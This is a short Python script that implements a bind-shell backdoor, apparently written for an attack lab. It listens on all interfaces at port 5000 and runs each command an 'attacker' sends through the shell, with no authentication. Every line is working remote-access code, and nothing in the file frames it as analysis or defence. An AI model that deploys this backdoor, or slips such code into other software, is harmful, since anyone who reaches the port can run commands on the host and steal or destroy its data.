import socket
import sys
import threading
import subprocess

def setup_victim_socket(HOST, PORT):
    connection = (HOST, PORT)
    try:
        victim_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        victim_sock.bind(connection)
        victim_sock.listen(5)
        print(f"victim listening on port {PORT}")
        return victim_sock
    except Exception as e:
        print(f"Error: Unable to create victim socket: {e}")
        sys.exit(1)

def wait_for_connection(victim_sock):
    try:
        conn, attacker_addr = victim_sock.accept()
        print(f"victim is listening on {attacker_addr}")
        return conn
    except Exception as e:
        print(f"Error: Unable to accept connection: {e}")
        return None

def handle_attacker(attacker_sock, LINE_LEN):
    try:
        while True:
            cmd = attacker_sock.recv(LINE_LEN).decode('utf-8')
            if not cmd:
                break
            print(f"Received command: {cmd}")

            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
            except subprocess.CalledProcessError as e:
                output = e.output if e.output else f"Error executing command: {e}"

            attacker_sock.sendall(output.encode('utf-8'))
            attacker_sock.sendall(b'EOF')  
    except ConnectionResetError:
        print("Connection closed by attacker.")
    finally:
        attacker_sock.close()

def main():
    HOST = "0.0.0.0"
    PORT = 5000
    LINE_LEN = 4096
    
    victim_sock = setup_victim_socket(HOST, PORT)
    
    try:
       while True:
            conn = wait_for_connection(victim_sock)
            if conn is not None:
                attacker_thread = threading.Thread(target=handle_attacker, args=(conn, LINE_LEN))
                attacker_thread.start()   
    except KeyboardInterrupt:
        print("\nShutting down and closing the connection")
    finally:
        victim_sock.close()


if __name__ == "__main__":
    main()

